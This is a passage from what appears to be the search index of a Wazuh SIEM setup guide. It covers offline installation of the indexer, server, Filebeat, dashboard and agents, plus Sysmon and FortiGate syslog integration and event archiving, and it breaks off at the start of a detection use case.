/etc/wazuh-indexer/certs\n</code></pre> <p>Move each node\u2019s certificate and key files (e.g., <code>node-1.pem</code> and <code>node-1-key.pem</code>) to their respective <code>certs</code> folder. These files are specific to each node and shouldn\u2019t be shared with others. However, do not move the <code>root-ca.pem</code> certificate\u2014copy it instead, so it can be deployed to other component folders later.</p> <p>Edit <code>/etc/wazuh-indexer/opensearch.yml</code> and modify the following settings:</p> <ol> <li><code>network.host</code> \u2013 Defines the node\u2019s address for HTTP and transport traffic. It should match the address used in <code>config.yml</code> when generating SSL certificates.</li> <li><code>node.name</code> \u2013 Set this to the Wazuh indexer node name as defined in <code>config.yml</code> (e.g., <code>node-1</code>).</li> <li><code>cluster.initial_master_nodes</code> \u2013 List the names of master-eligible nodes, as specified in <code>config.yml</code>.</li> </ol> <pre><code>network.host: \"10.0.0.20\"\nnode.name: \"node-1\"\ncluster.initial_master_nodes:\n- \"node-1\"\n#- \"node-2\"\n#- \"node-3\"\n</code></pre> <ol> <li><code>discovery.seed_hosts</code> \u2013 Contains the addresses of master-eligible nodes. Leave it commented for a single-node setup, but for multi-node configurations, uncomment it and specify the node addresses.</li> </ol> <pre><code>discovery.seed_hosts:\n  - \"10.0.0.1\"\n  - \"10.0.0.2\"\n  - \"10.0.0.3\"\n</code></pre> <ol> <li><code>plugins.security.nodes_dn</code> \u2013 Lists the Distinguished Names (DNs) of certificates for all Wazuh indexer cluster nodes. Uncomment and modify these based on your settings and <code>config.yml</code>.</li> </ol> <pre><code>plugins.security.nodes_dn:\n- \"CN=node-1,OU=Wazuh,O=Wazuh,L=California,C=US\"\n- \"CN=node-2,OU=Wazuh,O=Wazuh,L=California,C=US\"\n- \"CN=node-3,OU=Wazuh,O=Wazuh,L=California,C=US\"\n</code></pre> <p>Enable and start the Wazuh indexer service. Verify Wazuh indexer is active and running (exit with <code>q</code>)</p> <pre><code>systemctl daemon-reload\nsystemctl enable wazuh-indexer\nsystemctl start wazuh-indexer\nsystemctl status wazuh-indexer\n</code></pre> <p>Once all Wazuh indexer nodes are running, execute the <code>indexer-security-init.sh</code> script on any Wazuh indexer node. This updates the certificate information and initiates the cluster.</p> <pre><code>/usr/share/wazuh-indexer/bin/indexer-security-init.sh\n</code></pre> <p>Run the following command to check that the installation is successful. </p> <pre><code>curl -XGET https://10.0.0.20:9200 -u admin:admin -k\n</code></pre> <pre><code>#Example output\n{\n  \"name\" : \"node-1\",\n  \"cluster_name\" : \"wazuh-cluster\",\n  \"cluster_uuid\" : \"6hQpHd5cSzCLrhFo0T-Crg\",\n  \"version\" : {\n    \"number\" : \"7.10.2\",\n    \"build_type\" : \"rpm\",\n    \"build_hash\" : \"eee49cb340edc6c4d489bcd9324dda571fc8dc03\",\n    \"build_date\" : \"2023-09-20T23:54:29.889267151Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"9.7.0\",\n    \"minimum_wire_compatibility_version\" : \"7.10.0\",\n    \"minimum_index_compatibility_version\" : \"7.0.0\"\n  },\n  \"tagline\" : \"The OpenSearch Project: https://opensearch.org/\"\n}\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-the-wazuh-server","title":"Installing the Wazuh server","text":"<p>Run the following commands to import the Wazuh key and install the Wazuh manager.</p> <p>RPM:</p> <pre><code>rpm --import ./wazuh-offline/wazuh-files/GPG-KEY-WAZUH\nrpm -ivh ./wazuh-offline/wazuh-packages/wazuh-manager*.rpm\n</code></pre> <p>DEB:</p> <p>On systems with\u00a0apt\u00a0as package manager, the following dependencies must be installed on the Wazuh server nodes.</p> <ul> <li>gnupg</li> <li>apt-transport-https</li> </ul> <pre><code>dpkg -i ./wazuh-offline/wazuh-packages/wazuh-manager*.deb\n</code></pre> <p>Store the Wazuh indexer username and password in the Wazuh manager keystore using the <code>wazuh-keystore</code> tool.</p> <p>Note: The default credentials for an offline installation are admin:admin.</p> <pre><code>echo '&lt;INDEXER_USERNAME&gt;' | /var/ossec/bin/wazuh-keystore -f indexer -k username\necho '&lt;INDEXER_PASSWORD&gt;' | /var/ossec/bin/wazuh-keystore -f indexer -k password\n</code></pre> <p>Enable and start the Wazuh manager service. Verify Wazuh manager is active and running (exit with <code>q</code>)</p> <pre><code>systemctl daemon-reload\nsystemctl enable wazuh-manager\nsystemctl start wazuh-manager\nsystemctl status wazuh-manager\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-filebeat","title":"Installing Filebeat","text":"<p>Filebeat must be installed and configured on the same server as the Wazuh manager. Run the following command to install Filebeat.</p> <p>RPM:</p> <pre><code>rpm -ivh ./wazuh-offline/wazuh-packages/filebeat*.rpm\n</code></pre> <p>DEB:</p> <pre><code>dpkg -i ./wazuh-offline/wazuh-packages/filebeat*.deb\n</code></pre> <p>Copy the configuration files to the correct location. When prompted, type \"yes\" to overwrite <code>/etc/filebeat/filebeat.yml</code>.</p> <p>Note for CentOS: Remove <code>&amp;&amp;\\</code> from the command.</p> <pre><code>cp ./wazuh-offline/wazuh-files/filebeat.yml /etc/filebeat/ &amp;&amp;\\\ncp ./wazuh-offline/wazuh-files/wazuh-template.json /etc/filebeat/ &amp;&amp;\\\nchmod go+r /etc/filebeat/wazuh-template.json\n</code></pre> <p>Edit the\u00a0<code>/etc/filebeat/filebeat.yml</code>\u00a0configuration file and replace the following value:</p> <p><code>hosts</code>: The list of Wazuh indexer nodes to connect to. You can use either IP addresses or hostnames. By default, the host is set to localhost\u00a0<code>hosts:\u00a0[\"127.0.0.1:9200\"]</code>. Replace it with your Wazuh indexer address accordingly. </p> <p>If you have more than one Wazuh indexer node, you can separate the addresses using commas. For example,\u00a0<code>hosts:\u00a0[\"10.0.0.1:9200\",\u00a0\"10.0.0.2:9200\",\u00a0\"10.0.0.3:9200\"]</code></p> <pre><code># Wazuh - Filebeat configuration file\n output.elasticsearch:\n hosts: [\"10.0.0.20:9200\"]\n protocol: https\n username: ${username}\n password: ${password}\n</code></pre> <p>Create a Filebeat keystore to securely store authentication credentials.</p> <pre><code>filebeat keystore create\n</code></pre> <p>Add the username and password\u00a0<code>admin</code>:<code>admin</code>\u00a0to the secrets keystore.</p> <pre><code>echo admin | filebeat keystore add username --stdin --force\necho admin | filebeat keystore add password --stdin --force\n</code></pre> <p>Install the Wazuh module for Filebeat.</p> <pre><code>tar -xzf ./wazuh-offline/wazuh-files/wazuh-filebeat-0.4.tar.gz -C /usr/share/filebeat/module\n</code></pre> <p>Replace\u00a0<code>&lt;SERVER_NODE_NAME&gt;</code>\u00a0with your Wazuh server node certificate name, the same used in\u00a0<code>config.yml</code>\u00a0when creating the certificates. For example,\u00a0<code>wazuh-1</code>. Then, move the certificates to their corresponding location.</p> <p>On CentOS, if you encounter the error:</p> <pre><code>chmod: cannot access '/etc/filebeat/certs/*': No such file or directorty\n</code></pre> <p>Navigate to <code>/etc/filebeat/certs/</code> and run <code>chmod 400 *</code> as a root user</p> <pre><code>NODE_NAME=&lt;SERVER_NODE_NAME&gt;\n</code></pre> <pre><code>mkdir /etc/filebeat/certs\nmv -n wazuh-install-files/$NODE_NAME.pem /etc/filebeat/certs/filebeat.pem\nmv -n wazuh-install-files/$NODE_NAME-key.pem /etc/filebeat/certs/filebeat-key.pem\ncp wazuh-install-files/root-ca.pem /etc/filebeat/certs/\nchmod 500 /etc/filebeat/certs\nchmod 400 /etc/filebeat/certs/*\nchown -R root:root /etc/filebeat/certs\n</code></pre> <p>Enable and start the Filebeat service. Verify Filebeat is active and running (exit with <code>q</code>)</p> <pre><code>systemctl daemon-reload\nsystemctl enable filebeat\nsystemctl start filebeat\nsystemctl status filebeat\n</code></pre> <p>Run the following command to make sure Filebeat is successfully installed.</p> <pre><code>filebeat test output\n</code></pre> <pre><code>#Example output\nelasticsearch: https://10.0.0.20:9200...\n  parse url... OK\n  connection...\n    parse host... OK\n    dns lookup... OK\n    addresses: 10.0.0.20\n    dial up... OK\n  TLS...\n    security: server's certificate chain verification is enabled\n    handshake... OK\n    TLS version: TLSv1.3\n    dial up... OK\n  talk to server... OK\n  version: 7.10.2\n</code></pre> <p>Wazuh server node is now successfully installed.</p>"},{"location":"wazuh/wazuh.html#installing-the-wazuh-dashboard","title":"Installing the Wazuh Dashboard","text":"<p>RPM:</p> <p>The following dependencies must be installed on the Wazuh dashboard node.</p> <ul> <li>libcap</li> </ul> <pre><code>rpm --import ./wazuh-offline/wazuh-files/GPG-KEY-WAZUH\nrpm -ivh ./wazuh-offline/wazuh-packages/wazuh-dashboard*.rpm\n</code></pre> <p>DEB:</p> <p>The following dependencies must be installed on the Wazuh dashboard node.</p> <ul> <li>debhelper version 9 or later</li> <li>tar</li> <li>curl</li> <li>libcap2-bin</li> </ul> <pre><code>dpkg -i ./wazuh-offline/wazuh-packages/wazuh-dashboard*.deb\n</code></pre> <p>Replace\u00a0<code>&lt;DASHBOARD_NODE_NAME&gt;</code>\u00a0with your Wazuh dashboard node name, the same used in\u00a0<code>config.yml</code>\u00a0to create the certificates. For example,\u00a0<code>dashboard</code>. Then, move the certificates to their corresponding location.</p> <p>On CentOS, if you encounter the error:</p> <pre><code>chmod: cannot access '/etc/wazuh-dashboard/certs/*': No such file or directorty\n</code></pre> <p>Navigate to <code>/etc/wazuh-dashboard/certs/</code> and run <code>chmod 400 *</code> as a root user</p> <pre><code>NODE_NAME=&lt;DASHBOARD_NODE_NAME&gt;\n</code></pre> <pre><code>mkdir /etc/wazuh-dashboard/certs\nmv -n wazuh-install-files/$NODE_NAME.pem /etc/wazuh-dashboard/certs/dashboard.pem\nmv -n wazuh-install-files/$NODE_NAME-key.pem /etc/wazuh-dashboard/certs/dashboard-key.pem\ncp wazuh-install-files/root-ca.pem /etc/wazuh-dashboard/certs/\nchmod 500 /etc/wazuh-dashboard/certs\nchmod 400 /etc/wazuh-dashboard/certs/*\nchown -R wazuh-dashboard:wazuh-dashboard /etc/wazuh-dashboard/certs\n</code></pre> <p>Edit the\u00a0<code>/etc/wazuh-dashboard/opensearch_dashboards.yml</code>\u00a0file and replace the following values:</p> <ol> <li><code>server.host</code>: This setting specifies the host of the back end server. To allow remote users to connect, set the value to the IP address or DNS name of the Wazuh dashboard. The value\u00a0<code>0.0.0.0</code>\u00a0will accept all the available IP addresses of the host.</li> <li><code>opensearch.hosts</code>: The URLs of the Wazuh indexer instances to use for all your queries. The Wazuh dashboard can be configured to connect to multiple Wazuh indexer nodes in the same cluster. The addresses of the nodes can be separated by commas. For example,\u00a0<code>[\"https://10.0.0.2:9200\",\u00a0\"https://10.0.0.3:9200\",\"https://10.0.0.4:9200\"]</code></li> </ol> <pre><code>server.host: 10.0.0.20\nserver.port: 443\nopensearch.hosts: https://10.0.0.20:9200\nopensearch.ssl.verificationMode: certificate\n</code></pre> <p>Enable and start the Wazuh dashboard. Verify Wazuh dashboard is active and running (exit with <code>q</code>)</p> <pre><code>systemctl daemon-reload\nsystemctl enable wazuh-dashboard\nsystemctl start wazuh-dashboard\nsystemctl status wazuh-dashboard\n</code></pre> <p>Edit the file\u00a0<code>/usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml</code>\u00a0and replace the\u00a0<code>url</code>\u00a0value with the IP address or hostname of the Wazuh server master node.</p> <pre><code>hosts:\n  - default:\n      url: https://10.0.0.20\n      port: 55000\n      username: wazuh-wui\n      password: wazuh-wui\n      run_as: false\n</code></pre> <p>Access the web interface.</p> <ul> <li>URL:\u00a0https://</li> <li>Username: admin</li> <li>Password: admin</li> </ul> <p></p>"},{"location":"wazuh/wazuh.html#importing-certificate-optional","title":"Importing Certificate (Optional)","text":"<p>Upon the first access to the Wazuh dashboard, the browser shows a warning message stating that the certificate was not issued by a trusted authority. An exception can be added in the advanced options of the web browser or, for increased security, the\u00a0<code>root-ca.pem</code>\u00a0file previously generated can be imported to the certificate manager of the browser. </p> <p>Copy /etc/wazuh-dashboard/certs/root-ca.pem to user\u2019s home directory</p> <pre><code>cp /etc/wazuh-dashboard/certs/root-ca.pem ~/\n</code></pre> <p>Change ownership of user's home directory to the non-root user to enable read access to <code>root-ca.pem</code></p> <p>On Firefox, go to Settings, Privacy &amp; Security and Certificates. Click View Certificates.</p> <p></p> <p>Click Import, select <code>root-ca.pem</code> in user\u2019s home directory. Select Trust this CA to identify website and email users. Click OK.</p> <p></p> <p>Delete root-ca.pem from user\u2019s home directory.</p> <pre><code>sudo rm root-ca.pem\n</code></pre>"},{"location":"wazuh/wazuh.html#securing-wazuh-installation-optional","title":"Securing Wazuh Installation (Optional)","text":"<p>You have now installed and configured all the Wazuh central components. We recommend changing the default credentials to protect your infrastructure from possible attacks.</p> <p>Use the Wazuh passwords tool to change all the internal users passwords.</p> <pre><code>/usr/share/wazuh-indexer/plugins/opensearch-security/tools/wazuh-passwords-tool.sh --api --change-all --admin-user wazuh --admin-password wazuh\n</code></pre> <p>Save the new Wazuh indexer password into the Wazuh manager keystore. Restart Wazuh manager service.</p> <pre><code>/var/ossec/bin/wazuh-keystore -f indexer -k password -v &lt;SNIP&gt;\nsystemctl start wazuh-manager\nsystemctl status wazuh-manager\n</code></pre> <p>Add the new password to the Filebeat secrets keystore. Restart the Filebeat service</p> <pre><code>echo \"&lt;SNIP&gt;\" | filebeat keystore add password --stdin --force\nsystemctl restart filebeat\nfilebeat test output\n</code></pre> <p>Verify that new password has been added to /usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml. Restart the Wazuh dashboard.</p> <pre><code>nano /usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml\nsystemctl restart wazuh-dashboard\nsystemctl status wazuh-dashboard\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-wazuh-agents-on-endpoints","title":"Installing Wazuh Agents on Endpoints","text":""},{"location":"wazuh/wazuh.html#configuring-firewall-on-windows","title":"Configuring Firewall on Windows","text":"<p>For Wazuh agent to communicate with the Wazuh manager services, the following ports needs to be allowed for outbound connection:</p> <ul> <li>1514/TCP for agent communication.</li> <li>1515/TCP for enrollment via automatic agent request.</li> <li>55000/TCP for enrollment via manager API.</li> </ul> <p>Open Windows Defender Firewall with Advanced Security. Right-click Outbound Rules and create new rule. Select Port.</p> <p></p> <p>Select TCP and Specific remote ports. Put 1514, 1515, 55000. Click Next.</p> <p></p> <p>Select Allow the connection.</p> <p></p> <p>Select Domain, Private and Public.</p> <p></p> <p>Name the New Outbound Rule as Wazuh outbound and click Finish.</p> <p></p>"},{"location":"wazuh/wazuh.html#installing-wazuh-agent-on-windows","title":"Installing Wazuh agent on Windows","text":"<p>The agent runs on the endpoint you want to monitor and communicates with the Wazuh server, sending data in near real-time through an encrypted and authenticated channel.</p> <p>Note To perform the installation, administrator privileges are required.</p> <p>To start the installation process, download the\u00a0Windows installer.</p> <p>Open PowerShell as Administrator and change directory to where Windows installer is located. Run the following command:</p> <pre><code>.\\wazuh-agent-4.11.0-1.msi /q WAZUH_MANAGER=\"10.0.0.20\"\n</code></pre> <p>The installation process is now complete, and the Wazuh agent is successfully installed and configured. You can start the Wazuh agent from the GUI or by running:</p> <pre><code>NET START Wazuh\n</code></pre> <p>Once started, the Wazuh agent will start the enrollment process and register with the manager.</p>"},{"location":"wazuh/wazuh.html#troubleshooting-windows-wazuh-agent","title":"Troubleshooting Windows Wazuh Agent","text":"<p>If Wazuh agent on Windows is unable to connect to Wazuh server, open Wazuh Agent Manager</p> <p>If Authentication key show as , click Manage then Restart</p> <p>Click Save then Refresh</p> <p></p> <p>You should be able to see Authentication key. The Authentication key is used to encrypt the traffic from the agent to the Wazuh server.</p> <p>If issues still persist, refer to the log file located at <code>C:\\Program Files (x86)\\ossec-agent\\ossec.log</code></p> <p>Alternatively, refer to the Troubleshooting guide.</p> <p></p> <p>On Wazuh web UI, go to Server management, then Endpoints Summary.</p> <p>Verify that the Windows agent is active.</p> <p></p>"},{"location":"wazuh/wazuh.html#sysmon-integration","title":"Sysmon Integration","text":"<p>Perform the steps below to install and configure Sysmon on the Windows endpoint.</p> <p>Download Sysmon from the\u00a0Microsoft Sysinternals page.</p> <p>Download the Sysmon configuration file:\u00a0sysmonconfig.xml. Note this is a modified version of sysmonconfig.xml recommended for integration with Wazuh. </p> <p>Install Sysmon with the downloaded configuration file using PowerShell as an administrator:</p> <pre><code>.\\sysmon64.exe -accepteula -i .\\sysmonconfig.xml\n</code></pre> <p>Open notepad as Administrator and open <code>ossec.conf</code>.</p> <p>Add the following configuration within the\u00a0<code>&lt;ossec_config&gt;</code>\u00a0block to the Wazuh agent\u00a0<code>C:\\Program\u00a0Files\u00a0(x86)\\ossec-agent\\ossec.conf</code>\u00a0file to specify the location to collect Sysmon logs:</p> <pre><code>&lt;localfile&gt;\n  &lt;location&gt;Microsoft-Windows-Sysmon/Operational&lt;/location&gt;\n  &lt;log_format&gt;eventchannel&lt;/log_format&gt;\n&lt;/localfile&gt;\n</code></pre> <p>Restart the Wazuh agent to apply the changes by running the following PowerShell command as an administrator:</p> <pre><code>Restart-Service -Name Wazuh\n</code></pre>"},{"location":"wazuh/wazuh.html#monitoring-network-devices-with-wazuh","title":"Monitoring Network Devices with Wazuh","text":""},{"location":"wazuh/wazuh.html#configuring-syslog-logging-on-fortigate","title":"Configuring Syslog Logging on FortiGate","text":"<p>On FortiGate Command-Line Interface (CLI), run the following commands to configure Syslog Server Settings:</p> <pre><code>config log syslogd setting\n    set status enable\n    set server &lt;syslog-ng IP&gt;\n    set source-ip &lt;FortiGate IP&gt;\n    # set port &lt;port number&gt;  (Default port is 514)\n    # Verify settings by running \"show\"\nend\n</code></pre> <p>Configure Log Memory Filter:</p> <pre><code>config log memory filter\n    set forward-traffic enable\n    set local-traffic enable\n    set sniffer-traffic disable\n    set anomaly enable\n    set voip disable\n    set multicast-traffic enable\n    # Verify settings by running \"show full-configuration\"\nend\n</code></pre> <p>Configure Global System Settings:</p> <pre><code>config system global\n    set cli-audit-log enable\n    # Verify settings by running \"show\"\n    # Ensure the timezone is correct, e.g., \"Pacific/Auckland\"\nend\n</code></pre> <p>Enable Logging for Neighbour Events:</p> <pre><code>config log setting\n    set neighbor-event enable\nend\n</code></pre>"},{"location":"wazuh/wazuh.html#configuring-log-rotation","title":"Configuring Log Rotation","text":"<p>By default, the <code>logrotate</code> service is configured to rotate logs in directories like <code>/var/log/</code></p> <p>For <code>rsyslog</code>, the rotation of its default log files (e.g., <code>/var/log/syslog</code>) is managed by the configuration file located at <code>/etc/logrotate.d/rsyslog</code>. Open the /etc/logrotate.d/rsyslog file in a text editor:</p> <pre><code>sudo nano /etc/logrotate.d/rsyslog\n</code></pre> <p>Add the path to your <code>fortigate.log</code> file under the existing log files. </p> <pre><code>/var/log/syslog\n/var/log/fortigate.log\n...\n{\n    rotate 4\n    weekly\n    missingok\n    notifempty\n    compress\n    delaycompress\n    sharedscripts\n    postrotate\n        /usr/lib/rsyslog/rsyslog-rotate\n    endscript\n}\n</code></pre> <p>Key Settings:</p> <ul> <li>rotate 4: Keeps 4 log files before deleting the oldest one.</li> <li>weekly: Rotates logs once per week.</li> <li>missingok: If the log file is missing, no error will be raised.</li> <li>notifempty: Only rotates logs if they are not empty.</li> <li>compress: Compresses old log files (e.g., to <code>.gz</code>).</li> <li>delaycompress: Compresses the logs on the second rotation cycle, meaning the most recent rotated file is not compressed immediately.</li> <li>sharedscripts: Runs the <code>postrotate</code> script only once, even if multiple logs are rotated.</li> <li>postrotate: After log rotation, it runs <code>/usr/lib/rsyslog/rsyslog-rotate</code> to ensure that <code>rsyslog</code> reopens its log files (so it doesn't keep writing to the old rotated file).</li> </ul>"},{"location":"wazuh/wazuh.html#configuring-syslog-on-wazuh-server-optional","title":"Configuring Syslog on Wazuh Server (Optional)","text":"<p>The Wazuh server can collect logs via syslog from endpoints such as firewalls, switches, routers, and other devices that don\u2019t support the installation of Wazuh agents. More details can be found here.</p> <p>If you have a central logging server like Syslog or Logstash in place, you can install the Wazuh agent on that server to streamline log collection. This setup enables seamless forwarding of logs from multiple sources to the Wazuh server, facilitating comprehensive analysis.</p>"},{"location":"wazuh/wazuh.html#configure-rsyslog-on-ubuntu-endpoint-recommended","title":"Configure Rsyslog on Ubuntu endpoint (Recommended)","text":"<p>Rsyslog\u00a0is a preinstalled utility in Ubuntu 22.04 for receiving syslog events. The following section shows the steps for enabling Rsyslog on the Ubuntu endpoint and configuring the Wazuh agent to send the syslog log data to the Wazuh server.</p> <p>Edit /etc/rsyslog.conf. </p> <pre><code>nano /etc/rsyslog.conf\n</code></pre> <p>Uncomment udp/514. Add allowed sender and configure log file format. Save changes.</p> <pre><code>#provides UDP syslog reception\nmodule(load=\u201dimudp\u201d)\ninput(type=\u201dimudp\u201d port=\u201d514\")\n\n#Add allowed sender and configure log file format\n$AllowedSender UDP, 10.0.0.1/24\n$template remote-incoming-logs, \"/var/log/%HOSTNAME%.log\"\n*.* ?remote-incoming-logs\n</code></pre> <p>Permit udp/514 through the firewall (if firewall is configured and enabled).</p> <pre><code>sudo ufw allow 514/udp\n</code></pre> <p>Edit permissions on <code>/var/log</code> as Rsyslog may encounter permission error on relaunch. </p> <pre><code>sudo chmod 775 /var/log\n</code></pre> <p>Add any hosts you are receiving logs from to <code>/etc/hosts</code></p> <pre><code>sudo nano /etc/hosts\n</code></pre> <pre><code>#Example output\n10.0.0.1    Fortigate\n</code></pre> <p>Restart and check status of rsyslog.</p> <pre><code>sudo systemctl restart rsyslog\nsystemctl status rsyslog\n</code></pre> <p>Configure the syslog clients (network devices) to send logs to our syslog server. Check <code>/var/log</code> to see that new log files are updating.</p> <pre><code>ls /var/log\ncat fortigate.log\n</code></pre> <pre><code>#Example output\n2024-09-13T08:13:46.806479+12:00 fortigate date=2024-09-12 time=15:44:50 devname=\"Fortigate\" devid=\"FGVMEVUEOETC5XC8\" eventtime=1726112689938988753 tz=\"+1200\" logid=\"0001000014\" type=\"traffic\" subtype=\"local\" level=\"notice\" vd=\"root\" srcip=192.168.1.64 srcport=14712 srcintf=\"root\" srcintfrole=\"undefined\" dstip=38.21.192.5 dstport=443 dstintf=\"port1\" dstintfrole=\"wan\" srccountry=\"Reserved\" dstcountry=\"United States\" sessionid=44992 proto=6 action=\"close\" policyid=0 service=\"HTTPS\" trandisp=\"noop\" app=\"HTTPS\" duration=1 sentbyte=441 rcvdbyte=223 sentpkt=5 rcvdpkt=4\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-wazuh-agent-on-linux-ubuntu","title":"Installing Wazuh agent on Linux (Ubuntu)","text":"<p>Configure firewall:</p> <pre><code>ufw allow 55000/tcp\nufw allow 1514/tcp\nufw allow 1515/tcp\n</code></pre> <p>Download Wazuh agent from the packages list.</p> <pre><code>https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-indexer/wazuh-indexer_4.11.0-1_amd64.deb\n</code></pre> <p>Transfer the Wazuh agent to Ubuntu endpoint. Install the package using <code>dpkg</code></p> <pre><code>dpkg -i wazuh-agent_4.11.0-1_amd64.deb\n</code></pre> <p>After installing, set the Wazuh manager's IP address by editing the configuration file. Look for the <code>&lt;server&gt;</code> section and update it with the Wazuh manager's IP address.</p> <pre><code>nano /var/ossec/etc/ossec.conf\n</code></pre> <pre><code>&lt;ossec_config&gt;\n  &lt;client&gt;\n    &lt;server&gt;\n      &lt;address&gt;10.0.0.20&lt;/address&gt;\n      &lt;port&gt;1514&lt;/port&gt;\n      &lt;protocol&gt;tcp&lt;/protocol&gt;\n    &lt;/server&gt;\n    &lt;config-profile&gt;ubuntu, ubuntu22, ubuntu22.04&lt;/config-profile&gt;\n    &lt;notify_time&gt;10&lt;/notify_time&gt;\n    &lt;time-reconnect&gt;60&lt;/time-reconnect&gt;\n    &lt;auto_restart&gt;yes&lt;/auto_restart&gt;\n    &lt;crypto_method&gt;aes&lt;/crypto_method&gt;\n  &lt;/client&gt;\n</code></pre> <p>Start and enable the Wazuh agent. Verify Wazuh agent is active and running.</p> <pre><code>systemctl start wazuh-agent\nsystemctl enable wazuh-agent\nsystemctl status wazuh-agent\n</code></pre> <p>On Wazuh server UI, verify Ubuntu agent is active</p> <p></p>"},{"location":"wazuh/wazuh.html#configuring-wazuh-to-monitor-fortigate-log","title":"Configuring Wazuh to Monitor Fortigate Log","text":"<p>Add the following to <code>/var/ossec/etc/ossec.conf</code> file on Wazuh manager and agent.</p> <pre><code>#On both Wazuh manager and agent\n&lt;localfile&gt;\n  &lt;log_format&gt;syslog&lt;/log_format&gt;\n  &lt;location&gt;/var/log/fortigate.log&lt;/location&gt;\n&lt;/localfile&gt;\n</code></pre> <p>Restart the manager and agent after adding this setting:</p> <pre><code>systemctl restart wazuh-manager\nsystemctl restart wazuh-agent\n</code></pre> <p>Verify fortigate logs are being ingested. Follow the steps below to enable archiving and set up wazuh-archives-* index. Search wazuh-alerts- and wazuh-archives- index. Add filter for location is <code>/var/log/fortigate.log</code>.</p> <p></p> <p></p>"},{"location":"wazuh/wazuh.html#default-decoders-and-rules-for-fortigate","title":"Default Decoders and Rules for FortiGate","text":"<p>By default, Wazuh has pre-installed decoders and rules for FortiGate. This can be checked in Wazuh server UI under Rules and Decoders</p> <p></p> <p></p> <p>To test the default rule for FortiGate, SSH brute force attack was executed from Kali machine.</p> <p>The alert from the rule \u201cFortigate: Multiple high traffic events from same source\u201d was generated.</p> <p>This can be verified in Threat Intelligent, Events section on the web UI. </p> <p></p>"},{"location":"wazuh/wazuh.html#event-logging","title":"Event Logging","text":""},{"location":"wazuh/wazuh.html#log-compression-and-rotation","title":"Log Compression and Rotation","text":"<p>Log files can quickly accumulate and consume significant disk space in a system. To prevent this, the Wazuh manager compresses logs during its rotation process, helping to manage disk usage efficiently and maintain system performance. The Wazuh manager compresses log files daily or when they reach a certain threshold (file size, age, time, and more) and archives them. In the log rotation process, Wazuh creates a new log file with the original name to continuously write new events.</p> <p>Log files are compressed daily and digitally signed using MD5, SHA1, and SHA256 hashing algorithms. The compressed log files are stored in the\u00a0<code>/var/ossec/logs/</code>\u00a0directory</p>"},{"location":"wazuh/wazuh.html#archiving-event-logs","title":"Archiving Event Logs","text":"<p>Events are logs generated by applications, endpoints, and network devices. The Wazuh server stores all events it receives, whether or not they trigger a rule. These events are stored in the Wazuh archives located at\u00a0<code>/var/ossec/logs/archives/archives.log</code>\u00a0and\u00a0<code>/var/ossec/logs/archives/archives.json</code>. Security teams use archived logs to review historical data of security incidents, analyze trends, and generate reports to hunt threats.</p> <p>By default, the Wazuh archives are disabled because it stores logs indefinitely on the Wazuh server. When enabled, the Wazuh manager creates archived files to store and retain security data for compliance and forensic purposes.</p> <p>Note: The Wazuh archives retain logs collected from all monitored endpoints, therefore consuming significant storage resources on the Wazuh server over time. So, it is important to consider the impact on disk space and performance before enabling them.</p>"},{"location":"wazuh/wazuh.html#enabling-archiving","title":"Enabling archiving","text":"<p>Edit the Wazuh manager configuration file\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0and set the value of the highlighted fields below to\u00a0<code>yes</code>:</p> <pre><code>&lt;ossec_config&gt;\n  &lt;global&gt;\n    &lt;jsonout_output&gt;yes&lt;/jsonout_output&gt;\n    &lt;alerts_log&gt;yes&lt;/alerts_log&gt;\n    &lt;logall&gt;yes&lt;/logall&gt;\n    &lt;logall_json&gt;yes&lt;/logall_json&gt;\n&lt;/ossec_config&gt;\n</code></pre> <p><code>&lt;logall&gt;</code>\u00a0enables or disables archiving of all log messages. When enabled, the Wazuh server stores the logs in a syslog format. The allowed values are\u00a0<code>yes</code>\u00a0and\u00a0<code>no</code>.<code>&lt;logall_json&gt;</code>\u00a0enables or disables logging of events. When enabled, the Wazuh server stores the events in a JSON format. The allowed values are\u00a0<code>yes</code>\u00a0and\u00a0<code>no</code>.</p> <p>Depending on the format you desire, you can set one or both values of the highlighted fields to\u00a0<code>yes</code>. However, only the\u00a0<code>&lt;logall_json&gt;yes&lt;/logall_json&gt;</code>\u00a0option allows you to create an index that can be used to visualize the events on the Wazuh dashboard.</p> <p>Restart the Wazuh manager to apply the configuration changes:</p> <pre><code>systemctl restart wazuh-manager\n</code></pre> <p>Depending on your chosen format, the file\u00a0<code>archives.log</code>,\u00a0<code>archives.json</code>, or both will be created in the\u00a0<code>/var/ossec/logs/archives/</code>\u00a0directory on the Wazuh server. Wazuh uses a default log rotation policy. It ensures that available disk space is conserved by rotating and compressing logs on a daily, monthly, and yearly basis.</p>"},{"location":"wazuh/wazuh.html#visualising-events-on-dashboard","title":"Visualising Events on Dashboard","text":"<p>Edit the Filebeat configuration file\u00a0<code>/etc/filebeat/filebeat.yml</code>\u00a0and change the value of\u00a0<code>archives:\u00a0enabled</code>\u00a0from\u00a0<code>false</code>\u00a0to\u00a0<code>true</code>:</p> <pre><code>archives:\n enabled: true\n</code></pre> <p>Restart Filebeat to apply the configuration changes:</p> <pre><code>systemctl restart filebeat\n</code></pre>"},{"location":"wazuh/wazuh.html#configuring-wazuh-dashboard","title":"Configuring Wazuh Dashboard","text":"<p>Click the upper-left menu icon and navigate to\u00a0Dashboard management\u00a0&gt;\u00a0Index patterns\u00a0&gt;\u00a0Create index pattern. Use\u00a0<code>wazuh-archives-*</code>\u00a0as the index pattern name, and set\u00a0<code>timestamp</code>\u00a0in the\u00a0Time field\u00a0drop-down list.</p> <p></p> <p></p> <p>To view the events on the dashboard, click the upper-left menu icon and navigate to\u00a0Discover. Change the index pattern to\u00a0<code>wazuh-archives-*</code>.</p> <p></p>"},{"location":"wazuh/wazuh.html#introduction-to-wazuh","title":"Introduction to Wazuh","text":""},{"location":"wazuh/wazuh.html#use-case-detecting-signed-binary-proxy-execution","title":"Use case: Detecting Signed Binary Proxy Execution","text":"<p>Signed binary proxy execution is a technique threat actors use to bypass application whitelisting by using trusted binaries to run malicious code. This technique is identified as\u00a0<code>T1218.010</code>\u00a0based on the MITRE ATT&amp;CK framework.</p> <p>In this use case, we show how to abuse the Windows 